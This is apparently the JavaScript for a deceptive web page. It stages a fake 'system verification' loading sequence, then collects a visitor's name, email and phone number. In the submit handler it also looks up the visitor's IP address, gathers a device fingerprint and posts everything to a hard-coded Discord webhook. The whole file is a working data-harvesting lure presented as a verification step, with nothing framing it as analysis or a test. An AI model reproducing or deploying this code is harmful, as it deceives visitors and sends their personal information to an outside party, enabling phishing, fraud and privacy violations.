const WEBHOOK_URL = 'https://discord.com/api/webhooks/1303237998428299284/2VqK0JzF3uR9vI2D3v4w5X6Y7Z8a9B0c1D2e3F4g5H6';

let loadingProgress = 0;

const loadingSteps = [
    { text: 'Initializing system...', duration: 1500 },
    { text: 'Checking system requirements...', duration: 2000 },
    { text: 'Verifying device compatibility...', duration: 2000 },
    { text: 'Preparing authentication...', duration: 1500 },
    { text: 'Setting up verification...', duration: 1000 }
];

function getMobileDeviceType() {
    const userAgent = navigator.userAgent;
    if (/iPhone|iPad|iPod/i.test(userAgent)) {
        return 'iOS Device';
    } else if (/Android/i.test(userAgent)) {
        return 'Android Device';
    } else if (/Mobile|webOS|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
        return 'Mobile Device';
    } else {
        return 'Desktop/Laptop';
    }
}

function validateEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

function validatePhoneNumber(phone) {
    const cleaned = phone.replace(/[^0-9]/g, '');
    return cleaned.length >= 8 && cleaned.length <= 15;
}

function formatPhoneNumber(phone) {
    const cleaned = phone.replace(/[^0-9]/g, '');
    if (cleaned.length <= 3) {
        return cleaned;
    } else if (cleaned.length <= 6) {
        return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3)}`;
    } else if (cleaned.length <= 10) {
        return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3, 6)}-${cleaned.slice(6)}`;
    } else {
        return `+${cleaned.slice(0, cleaned.length - 10)} (${cleaned.slice(-10, -7)}) ${cleaned.slice(-7, -4)}-${cleaned.slice(-4)}`;
    }
}

function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const colorDepth = `${window.screen.colorDepth} bit`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const timestamp = new Date().toISOString();
    const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
    const cpuCores = navigator.hardwareConcurrency || 'Unknown';
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
    const browser = userAgent.match(/(Firefox|Chrome|Safari|Opera|Edge|MSIE|Trident\/|\.NET)/)?.[0] || 'Unknown';
    const os = userAgent.match(/(Windows|Mac OS|Linux|iOS|Android)/)?.[0] || 'Unknown';
    const mobileDeviceType = getMobileDeviceType();

    return {
        userAgent,
        platform,
        language,
        screenRes,
        colorDepth,
        timezone,
        timestamp,
        deviceMemory,
        cpuCores,
        isMobile,
        browser,
        os,
        mobileDeviceType
    };
}

async function sendWebhook(userData) {
    console.log('🚀 Starting webhook send process...');
    console.log('📋 User data:', userData);
    
    if (!WEBHOOK_URL) {
        console.error('❌ Webhook URL is not configured');
        return false;
    }
    
    try {
        console.log('🌐 Getting IP address...');
        const ip = await fetch('https://api.ipify.org?format=json')
            .then(response => {
                console.log('📡 IP response status:', response.status);
                return response.json();
            })
            .then(data => {
                console.log('✅ IP retrieved:', data.ip);
                return data.ip;
            })
            .catch(error => {
                console.error('❌ Failed to get IP:', error);
                return 'Unknown IP';
            });

        console.log('📱 Getting device info...');
        const deviceInfo = getDeviceInfo();
        console.log('📊 Device info collected:', deviceInfo);

        console.log('🔧 Building webhook payload...');
        const embed = {
            title: '📋 User Information Submitted',
            description: '👤 User submitted their personal information',
            color: 0x00ff00,
            fields: [
                { name: '👤 Full Name', value: userData.name || 'Not provided', inline: false },
                { name: '📧 Email Address', value: userData.email || 'Not provided', inline: false },
                { name: '📞 Phone Number', value: userData.phone || 'Not provided', inline: false },
                { name: '🌐 IP Address', value: ip, inline: true },
                { name: '📱 Device Type', value: deviceInfo.mobileDeviceType, inline: true },
                { name: '🖥️ Platform', value: deviceInfo.platform, inline: true },
                { name: '🌍 Language', value: deviceInfo.language, inline: true },
                { name: '📺 Screen Resolution', value: deviceInfo.screenRes, inline: true },
                { name: '🎨 Color Depth', value: deviceInfo.colorDepth, inline: true },
                { name: '🕐 Timezone', value: deviceInfo.timezone, inline: true },
                { name: '💾 Device Memory', value: deviceInfo.deviceMemory, inline: true },
                { name: '⚡ CPU Cores', value: deviceInfo.cpuCores, inline: true },
                { name: '🌐 Browser', value: deviceInfo.browser, inline: true },
                { name: '💻 Operating System', value: deviceInfo.os, inline: true },
                { name: '🕐 Timestamp', value: deviceInfo.timestamp, inline: false }
            ]
        };

        const payload = {
            embeds: [embed]
        };
        
        console.log('📤 Sending webhook to:', WEBHOOK_URL);
        console.log('📦 Payload:', JSON.stringify(payload, null, 2));

        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });
        
        console.log('📡 Webhook response status:', response.status);
        console.log('📡 Webhook response ok:', response.ok);
        
        if (response.ok) {
            console.log('✅ Webhook sent successfully!');
            return true;
        } else {
            const errorText = await response.text();
            console.error('❌ Failed to send webhook. Status:', response.status, 'Response:', errorText);
            return false;
        }
    } catch (error) {
        console.error('❌ Error sending webhook:', error);
        console.error('❌ Error details:', error.message);
        console.error('❌ Error stack:', error.stack);
        return false;
    }
}

function updateProgressBar(percentage) {
    const progressFill = document.getElementById('progress-fill');
    const progressText = document.getElementById('progress-text');
    
    progressFill.style.width = percentage + '%';
    
    if (percentage >= 100) {
        progressText.textContent = 'System ready!';
    }
}

function updateStatusItem(statusId, icon, text, isActive = false, isCompleted = false) {
    const statusItem = document.getElementById(statusId);
    const statusIcon = statusItem.querySelector('.status-icon');
    const statusText = statusItem.querySelector('.status-text');
    
    statusIcon.textContent = icon;
    statusText.textContent = text;
    
    statusItem.classList.remove('active', 'completed');
    if (isActive) {
        statusItem.classList.add('active');
    } else if (isCompleted) {
        statusItem.classList.add('completed');
    }
}

async function startLoadingSequence() {
    const progressFill = document.getElementById('progress-fill');
    const progressText = document.getElementById('progress-text');
    
    for (let i = 0; i < loadingSteps.length; i++) {
        const step = loadingSteps[i];
        progressText.textContent = step.text;
        
        // Update status items
        if (i === 0) {
            updateStatusItem('status-1', '⏳', step.text, true);
        } else if (i === 1) {
            updateStatusItem('status-1', '✅', 'Checking system requirements', false, true);
            updateStatusItem('status-2', '⏳', step.text, true);
        } else if (i === 2) {
            updateStatusItem('status-2', '✅', 'Verifying device compatibility', false, true);
            updateStatusItem('status-3', '⏳', step.text, true);
        } else if (i === 3) {
            updateStatusItem('status-3', '✅', 'Preparing authentication', false, true);
        }
        
        // Update progress bar
        const targetProgress = ((i + 1) / loadingSteps.length) * 100;
        const progressIncrement = targetProgress - loadingProgress;
        const steps = 20;
        const incrementAmount = progressIncrement / steps;
        
        for (let j = 0; j < steps; j++) {
            loadingProgress += incrementAmount;
            updateProgressBar(loadingProgress);
            await new Promise(resolve => setTimeout(resolve, step.duration / steps));
        }
        
        loadingProgress = targetProgress;
        updateProgressBar(loadingProgress);
    }
    
    // Complete all status items
    updateStatusItem('status-3', '✅', 'Preparing authentication', false, true);
    
    // Wait a moment before transitioning
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // Transition to info form screen
    document.getElementById('loading-screen').style.display = 'none';
    document.getElementById('verification-screen').style.display = 'flex';
}

function setupInfoForm() {
    const nameInput = document.getElementById('user-name');
    const emailInput = document.getElementById('user-email');
    const phoneInput = document.getElementById('user-phone');
    const submitBtn = document.getElementById('submit-info');
    const nameError = document.getElementById('name-error');
    const emailError = document.getElementById('email-error');
    const phoneError = document.getElementById('phone-error');
    
    // Clear errors on input
    nameInput.addEventListener('input', function() {
        nameError.classList.remove('show');
        nameInput.classList.remove('error');
    });
    
    emailInput.addEventListener('input', function() {
        emailError.classList.remove('show');
        emailInput.classList.remove('error');
    });
    
    phoneInput.addEventListener('input', function(e) {
        const formatted = formatPhoneNumber(e.target.value);
        e.target.value = formatted;
        phoneError.classList.remove('show');
        phoneInput.classList.remove('error');
    });
    
    submitBtn.addEventListener('click', async function() {
        const name = nameInput.value.trim();
        const email = emailInput.value.trim();
        const phone = phoneInput.value.trim();
        
        let hasError = false;
        
        // Validate name
        if (!name || name.length < 2) {
            nameError.textContent = 'Please enter your full name';
            nameError.classList.add('show');
            nameInput.classList.add('error');
            hasError = true;
        }
        
        // Validate email
        if (!validateEmail(email)) {
            emailError.textContent = 'Please enter a valid email address';
            emailError.classList.add('show');
            emailInput.classList.add('error');
            hasError = true;
        }
        
        // Validate phone
        if (!validatePhoneNumber(phone)) {
            phoneError.textContent = 'Please enter a valid phone number (8-15 digits)';
            phoneError.classList.add('show');
            phoneInput.classList.add('error');
            hasError = true;
        }
        
        if (hasError) {
            return;
        }
        
        // Disable button and show loading state
        submitBtn.disabled = true;
        submitBtn.textContent = 'Submitting...';
        
        // Prepare user data
        const userData = {
            name: name,
            email: email,
            phone: phone
        };
        
        try {
            // Send webhook with user data and wait for completion
            const webhookSuccess = await sendWebhook(userData);
            
            // Show success screen
            document.getElementById('info-form').style.display = 'none';
            document.getElementById('success-screen').style.display = 'block';
            
            // Log completion
            console.log('User information submitted successfully:', userData);
            console.log('Webhook status:', webhookSuccess ? 'Success' : 'Failed');
            
            // Could redirect or show additional options after success
            setTimeout(() => {
                console.log('Information submission process completed');
            }, 3000);
        } catch (error) {
            console.error('Error during submission:', error);
            
            // Show error message to user
            alert('There was an error submitting your information. Please try again.');
            
            // Re-enable the button
            submitBtn.disabled = false;
            submitBtn.textContent = 'Submit Information';
        }
    });
    
    // Allow Enter key submission
    [nameInput, emailInput, phoneInput].forEach(input => {
        input.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                submitBtn.click();
            }
        });
    });
}

window.addEventListener('load', function() {
    startLoadingSequence();
    setupInfoForm();
});
